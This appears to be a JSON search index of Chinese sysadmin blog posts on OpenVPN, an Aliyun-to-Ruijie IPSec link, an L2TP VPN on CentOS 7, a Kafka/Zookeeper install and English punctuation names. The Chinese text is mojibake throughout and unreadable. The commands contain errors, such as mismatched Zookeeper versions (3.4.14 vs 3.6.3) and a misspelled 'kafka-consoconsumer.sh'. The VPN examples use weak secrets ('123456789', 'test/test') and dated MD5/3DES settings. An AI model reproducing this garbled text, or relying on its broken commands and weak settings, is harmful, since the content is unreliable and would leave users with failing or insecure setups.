/etc/openvpn/conf/ipp.txt 2zhangranrui,172.18.0.8 æ³¨æ„ï¼Œä¸Šé¢æ–‡ä»¶é‡Œçš„ 172.18.0.8 ä¸æ˜¯ ip ï¼Œæ˜¯ ç½‘æ®µ åœ°å€\n172.18.0.9 æ˜¯ç½‘å…³åœ°å€ï¼Œ172.18.0.10æ‰æ˜¯çœŸæ­£çš„ IP åœ°å€ï¼Œæ‰€ä»¥ä¸è¦æé”™äº†\nä¹Ÿå¯ä»¥é’ˆå¯¹ç”¨æˆ·æ¨é€ä¸€äº›å…¶ä»–é€‰é¡¹ã€‚\n","date":"2022-11-19","img":"","permalink":"https://rendoumi.com/posts/20221119-openvpn_client/","series":null,"tags":null,"title":"OpenVPNå®¢æˆ·ç«¯å®šåˆ¶IPå’Œè·¯ç”±"},{"categories":null,"content":"é¢è¯• infosys çš„æ—¶å€™æ˜¯ä¸€ä¸ªå°åº¦è€å“¥åšè€ƒå®˜ï¼Œä»–é—®æˆ‘çš„é—®é¢˜æˆ‘æ˜¯ä¸€å¥éƒ½å¬ä¸æ‡‚çš„ï¼Œç¡®å®æ˜¯å¬ä¸æ‡‚ã€‚\nç„¶åä»–æŠŠé—®é¢˜åœ¨ webex ä¸­æ‰“å‡ºæ¥æˆ‘å›ç­”çš„ã€‚\nå…¶ä¸­æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šå¦‚ä½•ç”¨CLIæŸ¥å‡ºç³»ç»Ÿä¸­å†…å­˜å ç”¨æœ€é«˜çš„5ä¸ªè¿›ç¨‹\n1ps aux --sort=-%mem | head -n 5 ä¸Šé¢ä¸€å¥å¦‚ä½•ç”¨è‹±è¯­è¡¨è¾¾å‡ºæ¥å‘¢ï¼Œä¸å¥½è¯´å•Š\næ‰€ä»¥è®°å½•ä¸€ä¸‹ï¼Œä»¥å¤‡å°†æ¥ä¸æ—¶ä¹‹éœ€\n1ï¼ period å¥å· 2ï¼Œ comma é€—å· 3ï¼š colon å†’å· 4ï¼› semicolon åˆ†å· 5ï¼ exclamation æƒŠå¹å· 6ï¼Ÿ question é—®å· 7- hyphen è¿å­—ç¬¦ 8* asterisk æ˜Ÿå· 9\u0026#39; apostrophe æ‰€æœ‰æ ¼ç¬¦å·ï¼Œå•è¯å†…éƒ¨çš„çœç•¥ 10â€” dash ç ´æŠ˜å· 11_ underscore 12â€˜ â€™ single quotation marks å•å¼•å· 13â€œ â€ double quotation marks åŒå¼•å· 14( ) round brackets åœ†æ‹¬å· 15[ ] square brackets æ–¹æ‹¬å· 16\u0026lt;\u0026gt; Angle brackets å°–æ‹¬å· 17{} curly brackets or braces å¤§æ‹¬å· 18ã€Š ã€‹French quotes æ³•æ–‡å¼•å·ï¼›ä¹¦åå· 19... ellipsis çœç•¥å· 20Â¨ tandem colon åŒç‚¹å· 21\u0026#34; ditto åŒä¸Š 22â€– parallel åŒçº¿å· 23ï¼ slash æ–œçº¿å· 24ï¼† ampersand = and 25ï½ tilde æ³¢æµªå· 26Â§ section; division åˆ†èŠ‚å· 27â†’ arrow ç®­å·ï¼›å‚è§å· 28| vertical bar ç«–çº¿ 29backslash åæ–œçº¿ 30% percent ç™¾åˆ†å· ","date":"2022-11-17","img":"","permalink":"https://rendoumi.com/posts/20221117-sign/","series":null,"tags":null,"title":"è‹±è¯­çš„ç¬¦å·è¡¨è¾¾"},{"categories":null,"content":"ç°åœ¨ä¹Ÿå¼€å§‹æèµ·æ¡Œé¢è¿ç»´äº†ï¼Œå…¶å®è¿˜æ„Ÿè§‰è›®æœ‰æ„æ€çš„ã€‚\nå…¬å¸çš„ä¸»è·¯ç”±å™¨æ˜¯é”æ·çš„NBR6205-Eï¼Œä½œä¸ºIPSecçš„æœåŠ¡ç«¯ï¼Œè€Œé˜¿é‡Œäº‘ä½œä¸ºå®¢æˆ·ç«¯ã€‚\né¦–å…ˆå…ˆæ™®åŠä¸€ä¸‹IPSecçš„çŸ¥è¯†ï¼ŒIPSecç›®å‰åªæ”¯æŒIPv4å•æ’­ï¼š\nå¯†é’¥å®‰å…¨æœ‰ IKE è´Ÿè´£ï¼›æ•°æ®å®‰å…¨æ–¹é¢ï¼Œæœ‰ IPSec è´Ÿè´£ã€‚\nä½†æ˜¯IKEä¹Ÿæ˜¯ IPSec çš„ ä¸€ éƒ¨åˆ†ï¼Œä¸èƒ½ç‹¬ç«‹å­˜åœ¨ã€‚å­˜åœ¨ä¸¤ä¸ªSAåˆ†åˆ«ä¸º\nISAKMP Security Associationï¼ˆIKE SAï¼‰\nIPsec Security Associationï¼ˆIPsec SAï¼‰\nåœ¨è¿™é‡Œæ³¨æ„ä¸€ç‚¹å°±æ˜¯IKE SA=ISAKMP SA\nIKE SAçš„ lifetime é»˜è®¤ä¸º 86400 ç§’ï¼Œå³ä¸€å¤©ï¼Œé»˜è®¤æ²¡æœ‰volume limitã€‚\nç”¨æˆ·çš„æ•°æ®æµé‡çœŸæ­£æ˜¯åœ¨ IPsec SA ä¸Šä¼ é€’çš„ï¼Œè€Œä¸æ˜¯åœ¨IKE SAï¼›\nIPsec SAç›´æ¥ä¸ºç”¨æˆ·æ•°æ®æµæœåŠ¡ï¼ŒIPsec SAä¸­çš„æ‰€æœ‰å®‰å…¨ç­–ç•¥éƒ½æ˜¯ä¸ºäº†ç”¨æˆ·æ•°æ®æµçš„å®‰å…¨ã€‚\nIPsec SAçš„ lifetime é»˜è®¤ä¸º3600 ç§’ï¼Œå³1å°æ—¶ï¼›é»˜è®¤volume limitä¸º4608000 Kbytesï¼Œå³4.608 Gbyteã€‚\nå› ä¸ºSAæœ‰ä¸¤ä¸ªï¼Œåˆ†ä¸ºIKE SAå’ŒIPsec SAï¼Œä¸¤ä¸ªSAåˆ†åˆ«å®šä¹‰äº†å¦‚ä½•ä¿æŠ¤å¯†é’¥ä»¥åŠå¦‚ä½•ä¿æŠ¤æ•°æ®ï¼Œå…¶å®è¿™ä¸¤ä¸ªSAéƒ½æ˜¯ç”±IKEå»ºç«‹èµ·æ¥çš„ï¼Œæ‰€ä»¥å°†IKEçš„æ•´ä¸ªè¿è¡Œè¿‡ç¨‹åˆ†æˆäº†ä¸¤ä¸ªPhaseï¼ˆé˜¶æ®µï¼‰ï¼Œå³ ï¼š\nIKE Phase Two IKE Phase One ä¸€ã€IKE Phase Oneç¬¬ä¸€é˜¶æ®µ IKE Phase Oneçš„ä¸»è¦å·¥ä½œå°±æ˜¯å»ºç«‹IKE SAï¼ˆISAKMP SAï¼‰ï¼ŒIKE SAçš„æœåŠ¡å¯¹è±¡å¹¶ä¸æ˜¯ç”¨æˆ·æ•°æ®ï¼Œè€Œæ˜¯å¯†é’¥æµé‡ï¼Œä»¥åŠä¸ºIPsec SAæœåŠ¡çš„ï¼›IKE SAçš„åå•†é˜¶æ®µè¢«ç§°ä¸ºmain modeï¼ˆä¸»æ¨¡å¼ï¼‰è¿˜æœ‰ aggressive é‡è›®æ¨¡å¼ï¼ŒIKEä¹Ÿæ˜¯éœ€è¦ä¿æŠ¤è‡ªå·±çš„æµé‡å®‰å…¨çš„ï¼ˆè¿™äº›æµé‡å¹¶éç”¨æˆ·æµé‡ï¼‰ï¼Œæ‰€ä»¥IKE SAä¹‹é—´ä¹Ÿéœ€è¦åå•†å‡ºä¸€æ•´å¥—å®‰å…¨ç­–ç•¥ï¼Œå¦åˆ™åç»­çš„å¯†é’¥å’ŒIPsec SAçš„å»ºç«‹å°±ä¸èƒ½å¾—åˆ°å®‰å…¨ä¿è¯ï¼›\nIKE SAä¹‹é—´éœ€è¦åå•†çš„å¥—å®‰å…¨ç­–ç•¥åŒ…æ‹¬ï¼š\nè®¤è¯æ–¹å¼ï¼ˆAuthenticationï¼‰\nå…±æ€»æœ‰Pre-Shared Keys (PSK)ï¼ŒPublic Key Infrastructure (PKI)ï¼ŒRSA encrypted nonceï¼Œé»˜è®¤ä¸ºPKIã€‚\nåŠ å¯†ç®—æ³•ï¼ˆEncryptionï¼‰\næ€»å…±æœ‰DESï¼Œ3DESï¼ŒAES 128ï¼ŒAES 192ï¼ŒAES 256ï¼Œé»˜è®¤ä¸ºDESã€‚\nHashç®—æ³•ï¼ˆHMACï¼‰\næ€»å…±æœ‰SHA-1ï¼ŒMD5ï¼Œé»˜è®¤ä¸ºSHA-1ã€‚\nå¯†é’¥ç®—æ³•ï¼ˆDiffie-Hellmanï¼‰\nGroups 1 ï¼ˆ768 bitï¼‰ï¼ŒGroup 2ï¼ˆ1024 bitï¼‰ï¼ŒGroup 5ï¼ˆ1536 bitï¼‰ï¼Œé»˜è®¤ä¸ºGroups 1 ï¼ˆ768 bitï¼‰ã€‚\nLifetime\néšç”¨æˆ·å®šä¹‰ï¼Œé»˜è®¤ä¸º86,400 secondsï¼Œä½†æ²¡æœ‰volume limitã€‚\näºŒã€IKE Phase Twoç¬¬äºŒé˜¶æ®µ IKE Phase Twoçš„ç›®çš„æ˜¯è¦å»ºç«‹IPsec SAï¼Œç”±äºIKE SAçš„æœåŠ¡å¯¹è±¡å¹¶ä¸æ˜¯ç”¨æˆ·æ•°æ®ï¼Œè€Œæ˜¯å¯†é’¥æµé‡ï¼Œä»¥åŠä¸ºIPsec SAæœåŠ¡çš„ï¼ŒIKE SAæ˜¯ä¸ºIPsec SAåšå‡†å¤‡çš„ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰IKE SAï¼Œå°±ä¸ä¼šæœ‰IPsec SAï¼›IPsec SAæ˜¯åŸºäºIKE SAæ¥å»ºç«‹çš„ï¼Œå»ºç«‹IPsec SAçš„è¿‡ç¨‹ç§°ä¸º å¿«é€Ÿæ¨¡å¼ï¼ˆquick modeï¼‰ã€‚IPsec SAæ‰æ˜¯çœŸæ­£ä¸ºç”¨æˆ·æ•°æ®æœåŠ¡çš„ï¼Œç”¨æˆ·çš„æ‰€æœ‰æµé‡éƒ½æ˜¯åœ¨IPsec SAä¸­ä¼ è¾“çš„ï¼Œç”¨æˆ·æµé‡é IPsec SAæ¥ä¿æŠ¤ï¼ŒIPsec SAåŒæ ·ä¹Ÿéœ€è¦åå•†å‡ºä¸€æ•´å¥—å®‰å…¨ç­–ç•¥ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š\nåŠ å¯†ç®—æ³•ï¼ˆEncryptionï¼‰\næ€»å…±æœ‰DESï¼Œ3DESï¼ŒAES 128ï¼ŒAES 192ï¼ŒAES 256ï¼Œé»˜è®¤ä¸ºDESã€‚\nHashç®—æ³•ï¼ˆHMACï¼‰\næ€»å…±æœ‰SHA-1ï¼ŒMD5ï¼Œé»˜è®¤ä¸ºSHA-1ã€‚\nLifetime\néšç”¨æˆ·å®šä¹‰ï¼Œé»˜è®¤ä¸º3600 secondsï¼Œå³1å°æ—¶ï¼›é»˜è®¤volume limitä¸º4,608,000 Kbytesï¼Œå³4.608 Gbyteã€‚\næ³¨æ„ï¼šIPsec SAä¸­æ²¡æœ‰åå•†è®¤è¯æ–¹å¼ï¼ˆAuthenticationï¼‰å’Œå¯†é’¥ç®—æ³•ï¼ˆDiffie-Hellmanï¼‰ï¼Œå› ä¸ºIKE SAæ—¶å·²ç»è®¤è¯è¿‡äº†ï¼Œæ‰€ä»¥åé¢å·²ç»ä¸éœ€è¦å†è®¤è¯ï¼›å¹¶ä¸”å¯†é’¥æ˜¯åœ¨IKE SAå®Œæˆçš„ï¼Œæ‰€ä»¥åœ¨IPsec SAä¸­ä¹Ÿå°±è°ˆä¸äº†å¯†é’¥ç®—æ³•äº†ï¼Œä½†ä¹Ÿå¯ä»¥å¼ºåˆ¶å†ç®—ã€‚\nä¸Šé¢å¾ˆå•°å—¦äº†ä¸€æŠŠï¼Œä½†æ˜¯æ²¡åŠæ³•ï¼Œå› ä¸ºç­‰ä¼šè®¾ç½®çš„æ—¶å€™éƒ½è¦ç”¨åˆ°çš„ã€‚\nä¸‰ã€è®¾ç½®é”æ·è·¯ç”±å™¨ å‚æ•°ç»Ÿç»Ÿæå–ä¸€ä¸‹ï¼š\nå¯¹ç«¯IPï¼šå°±æ˜¯é˜¿é‡Œäº‘å®¢æˆ·ç«¯é‚£è¾¹çš„IPï¼Œ47.94.106.58\né¢„å…±äº«å¯†é’¥ï¼šä¸¤è¾¹éƒ½å…±äº«çš„ä¸€ä¸²å­—ç¬¦ä¸²\nIPSecéš§é“ç”Ÿå‘½å‘¨æœŸï¼šè¿™é‡Œåº”è¯¥æ˜¯ç¬¬äºŒé˜¶æ®µçš„æ—¶é—´ï¼Œ28800ç§’\nIKE ç­–ç•¥ï¼šç¬¬ä¸€é˜¶æ®µçš„IKEè®¾ç½®\næœºå¯†ç®—æ³•ï¼š3DES æ•£åˆ—ç®—æ³•ï¼šMD5 DHç»„ï¼šGroup2 ç”Ÿå‘½å‘¨æœŸï¼š28800ç§’\nè½¬æ¢é›†1ï¼šesp-3des esp-md5-hmac\nè½¬æ¢é›†2ï¼šesp-3des esp-sha-hmac\nå®Œç¾å‘å‰åŠ å¯†ï¼šgroup2(1024-bit)\nDPDæ¢æµ‹ç±»å‹ï¼šperiodic\nDPDæ¢æµ‹å‘¨æœŸï¼š30ç§’\nåå•†æ¨¡å¼ï¼šé‡è›®æ¨¡å¼\nåº”ç”¨åˆ°æ¥å£ï¼šGi0/7\néœ€ç»éš§é“è®¿é—®çš„ç½‘æ®µ\næœ¬åœ°ç½‘æ®µï¼š10.8.0.0/255.255.252.0 æ€»éƒ¨ç½‘æ®µ(å…¶å®å°±æ˜¯å¯¹ç«¯é˜¿é‡Œçš„vpcç½‘æ®µ)ï¼š10.10.240.0/255.255.240.0 å››ã€é…ç½®é˜¿é‡Œäº‘çš„IPSec 1ã€é¦–å…ˆè®¾ç½®VPNç½‘å…³ 2ã€å»ºç«‹ç”¨æˆ·ç½‘å…³ 3ã€å»ºç«‹IPsecè¿æ¥ 4ã€ç¼–è¾‘IPsecè¿æ¥ ä¸Šé¢é…ç½®è¦æ³¨æ„ï¼ŒVPNç½‘å…³å’Œç”¨æˆ·ç½‘å…³é€‰ä¹‹å‰åŠ å¥½çš„ï¼Œæœ¬ç«¯ç½‘æ®µå’Œå¯¹ç«¯ç½‘æ®µå’Œé”æ·è·¯ç”±å™¨ä¸Šæ˜¯ç›¸åçš„ã€‚é¢„å…±äº«å¯†é’¥æ˜¯ä¸€æ ·ã€‚\nå¦å¤–å°±æ˜¯æ„Ÿå…´è¶£æµæ¨¡å¼ï¼Œé€‰äº†è¿™ä¸ªï¼Œå°±éœ€è¦åœ¨è·¯ç”±è¡¨é‡Œæ‰‹åŠ¨å‘å¸ƒè·¯ç”±ï¼ï¼\nå†æ¥å°±æ˜¯é«˜çº§é…ç½®ï¼Œç¬¬ä¸€éƒ¨åˆ†IKEé…ç½®\næ³¨æ„å‚æ•°ï¼Œåå•†æ¨¡å¼ aggressive å°±æ˜¯é‡è›®æ¨¡å¼ã€‚\nç¬¬äºŒéƒ¨åˆ†IPsecé…ç½®ï¼š\nç„¶åéœ€è¦åˆ°VPNç½‘å…³ï¼Œå› ä¸ºé€‰äº†æ„Ÿå…´è¶£è·¯ç”±ï¼Œæ‰€ä»¥IPSecå»ºç«‹å¥½äº†ï¼Œè¿™é‡Œçš„ç­–ç•¥è·¯ç”±è¡¨ä¼šå‡ºç°ä¸€æ¡è·¯ç”±\næºï¼š10.10.240/21 ç›®æ ‡ï¼š10.8.0.0/22ï¼ŒçŠ¶æ€æ˜¯æœªå‘å¸ƒï¼Œç‚¹ä¸€ä¸‹å‘å¸ƒã€‚å°±å¥½äº†\nè¿™æ ·ä¸¤ç«¯çš„ IPSec å°±å»ºç«‹å¥½äº†ã€‚\n","date":"2022-11-15","img":"","permalink":"https://rendoumi.com/posts/20221115-ipsec/","series":null,"tags":null,"title":"é˜¿é‡Œäº‘IPSecä¸é”æ·è·¯ç”±å™¨å¾—è¿æ¥"},{"categories":null,"content":"è¿™æ˜¯ä¸ªå¾ˆå¥‡æ€ªçš„äº‹æƒ…ï¼Œåº”è˜äº†ä¸€å®¶æ CDN çš„å…¬å¸ï¼Œç»“æœä¸Šå»çœ‹äº†ä¸€ä¸‹æ ¹æœ¬ä¸å¯¹è·¯ã€‚å°±ç«‹åˆ»è¾äº†ï¼Œä½†æ˜¯å‘ç°å®ƒç»™å‘˜å·¥å¼€çš„ L2TP VPN ç¡®å®éå¸¸å¥½ç”¨ã€‚\näºæ˜¯å°±è‡ªå·±ä¹Ÿæ­ä¸€ä¸ªï¼Œæ–¹ä¾¿è‡ªç”¨ã€‚ä¸‹é¢è®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œç¯å¢ƒæ˜¯CentOS 7\nä¸€ã€è£…L2TP 1# yum install epel-release 2# yum install xl2tpd libreswan äºŒã€ä¿®æ”¹æ ¸å¿ƒå‚æ•° 1# vi /etc/sysctl.conf 2 3vm.swappiness = 0 4net.ipv4.neigh.default.gc_stale_time=120 5net.ipv4.conf.all.rp_filter=0 6net.ipv4.conf.default.rp_filter=0 7net.ipv4.conf.default.arp_announce = 2 8net.ipv4.conf.all.arp_announce=2 9net.ipv4.tcp_max_tw_buckets = 5000 10net.ipv4.tcp_syncookies = 1 11net.ipv4.tcp_max_syn_backlog = 1024 12net.ipv4.tcp_synack_retries = 2 13net.ipv4.conf.lo.arp_announce=2 14net.ipv4.ip_forward = 1 15net.ipv4.conf.default.accept_redirects = 0 16net.ipv4.conf.default.send_redirects = 0 17net.ipv4.conf.default.accept_source_route = 0 18 19# sysctl -p ä¸‰ã€é…ç½® IPSEC 1# vi /etc/ipsec.d/l2tp_psk.conf 2 3conn L2TP-PSK-NAT 4 rightsubnet=vhost:%priv 5 also=L2TP-PSK-noNAT 6conn L2TP-PSK-noNAT 7 authby=secret 8 pfs=no 9 auto=add 10 keyingtries=3 11 dpddelay=30 12 dpdtimeout=120 13 dpdaction=clear 14 rekey=no 15 ikelifetime=8h 16 keylife=1h 17 type=transport 18 left=192.168.10.232 19 leftprotoport=17/1701 20 right=%any 21 rightprotoport=17/%any æ³¨æ„ä¸Šé¢çš„ left=192.168.10.232ï¼Œè¿™æ˜¯æœåŠ¡å™¨çš„ipåœ°å€ï¼Œè¦æ›´æ¢ä¸ºè‡ªå·±æœåŠ¡å™¨çš„åœ°å€ï¼ˆå¦‚æœåœ¨é˜²ç«å¢™åï¼Œå†™å†…ç½‘åœ°å€ï¼Œéæ˜ å°„åçš„å…¬ç½‘IPï¼‰\nç„¶åä¿®æ”¹å¯†é’¥ï¼Œä¹‹åå»ºç«‹L2TPçš„ iphone è¿æ¥æ—¶ä¼šç”¨åˆ°ï¼š\n1# vim /etc/ipsec.secrets 2 3192.168.10.232 %any: PSK \u0026#34;123456789\u0026#34; éªŒè¯ä¸€ä¸‹ï¼š\n1# ipsec setup start 2 3# ipsec verify çœ‹åˆ°ä¸Šé¢ä¸¤è¡Œçº¢å­—ä¸è¦æ…Œå¼ ï¼ŒIgnoreï¼Œå¿½ç•¥æ‰å³å¯ã€‚æ˜¯å†…æ ¸ç‰¹æ€§ä¸­çš„reverse path filterç‰¹æ€§ï¼Œæ²¡å…³ç³»ã€‚\nç„¶åè®© ipsec è‡ªå¯åŠ¨\n1# systemctl enable ipsec å››ã€é…ç½®xl2tpd 1# å…ˆå¤‡ä»½ 2# mv /etc/xl2tpd/xl2tpd.conf /etc/xl2tpd/xl2tpd.conf.old 3 4# vim /etc/xl2tpd/xl2tpd.conf 5[global] 6listen-addr = 192.168.10.232 7ipsec saref = yes 8[lns default] 9ip range = 192.168.100.128-192.168.100.254 10local ip = 192.168.100.99 11require chap = yes 12refuse pap = yes 13require authentication = yes 14name = LinuxVPNserver 15ppp debug = yes 16pppoptfile = /etc/ppp/options.xl2tpd 17length bit = yes æ³¨æ„æ›´æ¢ä¸Šé¢ 192.168.10.232 çš„æœåŠ¡å™¨ipåœ°å€ï¼ŒåŒæ—¶è®°ä½name=LinuxVPNserver\n1# å…ˆå¤‡ä»½ 2# mv /etc/ppp/options.xl2tpd /etc/ppp/options.xl2tpd.old 3 4# vim /etc/ppp/options.xl2tpd 5ipcp-accept-local 6ipcp-accept-remote 7ms-dns 8.8.8.8 8ms-dns 4.2.2.4 9noccp 10#noauth 11crtscts 12idle 1800 13mtu 1410 14mru 1410 15nodefaultroute 16debug 17lock 18proxyarp 19connect-delay 5000 æœ€åç¼–è¾‘ç”¨æˆ·åå’Œå¯†ç \n1vim /etc/ppp/chap-secrets 2 3# Secrets for authentication using CHAP 4# client server secret IP addresses 5test LinuxVPNserver test * æ³¨æ„æ ¼å¼ï¼Œç¬¬ä¸€åˆ—æ˜¯ç”¨æˆ·åï¼Œç¬¬äºŒåˆ—æ˜¯ä¸Šé¢xl2tpd.confä¸­è®°ä½çš„nameåï¼Œç¬¬ä¸‰åˆ—æ˜¯å¯†ç ï¼Œç¬¬å››åˆ—æ˜¯è·å–åˆ°çš„ipåœ°å€\nç„¶åå¯åŠ¨\n1# systemctl start xl2tpd 2# systemctl enable xl2tpd 3# systemctl status xl2tpd äº”ã€é…ç½®é˜²ç«å¢™ 1iptables -A INPUT -p gre -j ACCEPT 2iptables -A OUTPUT -p gre -j ACCEPT 3iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT 4iptables -A FORWARD -s 192.168.100.0/24 -j ACCEPT 5iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE æ³¨æ„ä¸Šé¢çš„eth0ï¼Œæ ¹æ®æœåŠ¡å™¨çš„å…·ä½“æƒ…å†µè¿›è¡Œä¿®æ”¹\nç„¶åè¿™æ ·å°±å®Œæˆäº†ã€‚\nå…­ã€é…ç½®iphoneæ‰‹æœº é…ç½®å¥½æœåŠ¡å™¨ipï¼Œè´¦æˆ·ï¼Œå¯†ç ä»¥åŠå¯†é’¥å°±å¯ä»¥äº†ã€‚\n","date":"2022-11-13","img":"","permalink":"https://rendoumi.com/posts/20221113-l2tp_vpn/","series":null,"tags":null,"title":"L2TP VPNåœ¨CentOS7ç³»ç»Ÿä¸‹çš„æ­å»º"},{"categories":null,"content":"ç”Ÿäº§ç¯å¢ƒè¦ç”¨åˆ°kafkaï¼Œè®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œå…¶å®æœ€é‡è¦çš„ä¸æ˜¯å®‰è£…ï¼Œè€Œæ˜¯ä½¿ç”¨ã€‚\næ—¶é—´èŠ‚ç‚¹æ˜¯2022å¹´7æœˆ10æ—¥ï¼Œzookeeperçš„ç‰ˆæœ¬æ˜¯3.4.14ï¼š\n1wget https://mirrors.cnnic.cn/apache/zookeeper/stable/zookeeper-3.4.14.tar.gz kafkaçš„ç‰ˆæœ¬æ˜¯3.2ï¼Œæ³¨æ„å‰é¢çš„2.13æ˜¯scalaçš„ç‰ˆæœ¬\n1wget http://archive.apache.org/dist/kafka/3.2.0/kafka_2.13-3.2.0.tgz è½¯ä»¶éƒ½ä¸‹è½½å¥½ä»¥åï¼Œæ‰¾ä¸‰å°æœåŠ¡å™¨ï¼Œè½¯ä»¶éƒ½æ”¾åˆ° /usr/local è·¯å¾„ä¸‹ï¼š\næœåŠ¡å™¨çš„ipæ˜¯ï¼š\n1172.18.31.50 2172.18.31.51 3172.18.31.52 ç§»åŠ¨è½¯ä»¶ï¼š\n1tar zxvf zookeeper-3.4.14.tar.gz 2mv apache-zookeeper-3.6.3-bin /usr/local 3 4tar zxvf kafka_2.13-3.2.0.tgz 5mv kafka_2.13-3.2.0 /usr/local ç„¶åå¾—è£… java äº†ï¼Œcentos ç‰ˆæœ¬\n1yum -y install epel-release 2yum -y install java-11-openjdk-devel é¦–å…ˆå»ç¼–è¾‘zookeeperçš„é…ç½®æ–‡ä»¶ï¼Œç„¶åå¯åŠ¨\n1cp /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo_sample.cfg /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo.cfg ç¼–è¾‘zoo.cfgï¼Œå¢åŠ å‡ è¡Œ\n1dataDir=/data/zookeeper 2 3metricsProvider.className=org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider 4metricsProvider.httpPort=7000 5metricsProvider.exportJvmInfo=true 6 7server.0=172.18.31.50:20881:30881 8server.1=172.18.31.51:20881:30881 9server.2=172.18.31.52:20881:30881 æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬çš„æ•°æ®ç›®å½•æ˜¯åœ¨/data/zookeeperï¼Œæ‰€ä»¥è¦å…ˆå»ºç«‹å¥½ç›®å½•ç»“æ„\nç„¶åæœ‰ä¸‰å°æœåŠ¡å™¨ä¹ˆï¼ŒæŠŠå„è‡ªçš„idæ”¾åˆ°æ–‡ä»¶ä¸­ï¼Œç„¶å20881æ˜¯ä¸‰å°æœåŠ¡å™¨ä¹‹é—´çš„é€šè®¯ç«¯å£ï¼Œ30881æ˜¯é€‰ä¸¾ç«¯å£\n1mkdir /data/zookeeper -p 2echo 0 \u0026gt;/data/zookeeper/myid ä¸‰å°æœåŠ¡å™¨åˆ†åˆ«å¯åŠ¨\n1/usr/local/apache-zookeeper-3.6.3-bin/bin/zkServer.sh start éªŒè¯ä¸€ä¸‹\n1/usr/local/apache-zookeeper-3.6.3-bin/bin/zkCli.sh 2 3[zk: localhost:2181(CONNECTED) 1] ls / 4[admin, brokers, cluster, config, consumers, controller, controller_epoch, feature, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper] çœ‹çœ‹ / ä¸‹æœ‰ä¸œè¥¿å°±è¡Œäº†ï¼Œä¸Šé¢æ˜¯å·²ç»è£…å¥½äº† kafka å’Œ cruisecontrolçš„æƒ…å½¢ï¼Œä¸œè¥¿å°±æ¯”è¾ƒå¤šäº†\nç„¶åè£… kafkaï¼Œå…ˆä¿®æ”¹é…ç½®æ–‡ä»¶\n1vi /usr/local/kafka_2.13-3.2.0/config/server.properties 2 3#éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ 4 5broker.id=0 6log.dirs=/data/kafka 7zookeeper.connect=172.18.31.50:2181,172.18.31.51:2181,172.18.31.52:2181 ç„¶åå¯åŠ¨å°±å¯ä»¥äº†\n1/usr/local/kafka_2.13-3.2.0/bin/kafka-server-start.sh -daemon /usr/local/kafka_2.13-3.2.0/config/server.properties éªŒè¯ä¸€ä¸‹ï¼š\n1# æ–°ç‰ˆçš„ kafka-topics.sh å‘½ä»¤å·²ç»å˜äº† 2 3cd /usr/local/kafka_2.13-3.2.0/bin 4 5# bootstrap-server å†™ä¸€ä¸ªå°±å¥½ï¼Œæˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª topic ï¼Œå«åš swimmingpool 6 7./kafka-topics.sh --create --bootstrap-server 172.18.31.50:9092 --replication-factor 3 --partitions 3 --topic swimmingpool 8 9# çœ‹çœ‹ç»†èŠ‚ 10 11./kafka-topics.sh --describe --bootstrap-server 172.18.31.50:9092 --topic swimmingpool 12Topic: swimmingpool TopicId: gOLXSh5NQPKMAwEroi_HcQ PartitionCount: 3 ReplicationFactor: 3 Configs: segment.bytes=1073741824 13 Topic: swimmingpool Partition: 0 Leader: 2 Replicas: 0,2,1 Isr: 2,1,0 14 Topic: swimmingpool Partition: 1 Leader: 2 Replicas: 2,1,0 Isr: 2,0,1 15 Topic: swimmingpool Partition: 2 Leader: 2 Replicas: 1,0,2 Isr: 2,0,1 16 17 18# ç”Ÿäº§ä¸€äº›æ¶ˆæ¯ï¼Œctrl+c æ–­å‡º 19 20./kafka-console-producer.sh --bootstrap-server 172.18.31.50:9092 --topic swimmingpool 21 22\u0026gt;i am ok 23\u0026gt;i am fine 24\u0026gt;i am good 25 26# æ¶ˆè´¹è¿™äº›æ¶ˆæ¯ï¼ŒåŒæ ·ç”¨ ctrl+c æ–­å‡ºï¼Œæ³¨æ„çœ‹ï¼Œæ¶ˆæ¯æ˜¯å€’åºçš„ 27 28./kafka-consoconsumer.sh --bootstrap-server 172.18.31.50:9092 --topic swimmingpool --from-beginning 29i am good 30i am fine 31i am ok è¿™æ ·å°±è£…å¥½äº†ï¼Œä½†æ˜¯å®‰è£…åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œé‡è¦çš„æ˜¯ topic çš„ reblance ä»¥åŠ partion çš„é‡æ–°åˆ†å¸ƒ\n","date":"2022-11-13","img":"","permalink":"https://rendoumi.com/posts/20221113-kafka/","series":null,"tags":null,"title":"Kafkaçš„å®‰è£…å’ŒéªŒè¯"},{"categories":null,"content":"å…¶å®æœ¬èº«è‡ªå·±æ˜¯æ¯”è¾ƒå–œæ¬¢ javascripts çš„ï¼Œä½†æ˜¯ Python ä¹Ÿæ˜¯å¿…é¡»æŒæ¡çš„ä¸€é¡¹æŠ€èƒ½ã€‚\nå¹² devops ansible è·Ÿ python ä¹Ÿè„±ä¸äº†å¹²ç³»ï¼Œæ‰€ä»¥å‡†å¤‡ç”¨ django å¼€å‘ä¸€ä¸ªè‡ªåŠ¨ä¸Šçº¿çš„ç³»ç»Ÿã€‚\nå…ˆå‡†å¤‡ä¸€ä¸‹ Python ä»¥åŠ Django çš„ç¯å¢ƒå¥½äº†ã€‚\nä¸€ã€å‡†å¤‡ Python ç§˜ç±ï¼Œä¸è¦ç”¨ä»€ä¹ˆ venv ä¹‹ç±»çš„ä¸œè¥¿ï¼Œæ±¡æŸ“ç¯å¢ƒã€‚ç›´æ¥ä¸‹è½½æºä»£ç ç¼–è¯‘å®‰è£…ï¼Œç„¶åæŠŠ py å°åˆ°è‡ªå·±çš„å¯†é—­æ˜¯ç‹é“ï¼Œæœ€åå¼•ç”¨ä¸€ä¸‹ $PATH 